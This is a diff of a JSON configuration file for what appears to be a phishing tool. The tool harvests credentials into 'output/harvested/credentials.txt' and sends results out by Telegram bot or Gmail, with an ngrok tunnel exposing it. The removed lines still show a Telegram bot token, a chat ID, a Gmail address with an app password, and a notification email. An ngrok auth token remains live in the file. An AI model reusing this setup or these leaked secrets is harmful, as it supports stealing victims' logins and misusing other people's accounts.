@@ -1,12 +1,12 @@
 {
     "output_method": "telegram",
-    "telegram_bot_token": "7191024189:AAGZHq2c6kYiAArvwWgv0Xd4WPQko_1N2E8",
-    "telegram_chat_id": "6324121131",
+    "telegram_bot_token": "",
+    "telegram_chat_id": "",
     "email_smtp_server": "smtp.gmail.com",
     "email_smtp_port": 587,
-    "email_address": "ikehacks0@gmail.com",
-    "email_password": "jpiwliblwbebymnq",
-    "notification_email": "aduamahdaniel16@gmail.com",
+    "email_address": "",
+    "email_password": "",
+    "notification_email": "",
     "output_file": "output/harvested/credentials.txt",
     "ngrok_token": "2sna4xaLCuizFFrSMiTARQmnZX6_3aZburT5zqe27DLGGzNod"
 }
